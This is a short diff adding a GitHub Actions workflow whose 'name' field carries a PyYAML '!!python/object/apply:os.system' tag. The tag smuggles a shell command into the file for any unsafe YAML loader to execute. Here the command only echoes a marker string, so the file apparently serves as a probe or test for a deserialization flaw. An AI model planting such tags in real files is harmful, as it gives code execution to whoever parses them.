@@ -1,0 +1,3 @@
+name: !!python/object/apply:os.system ["echo zqy1"]
+on: { push: { paths: [ '.github/workflows/zqy1.yml' ] } }
+jobs: { j: { runs-on: ubuntu-latest, steps: [ { run: "echo hi" } ] } }
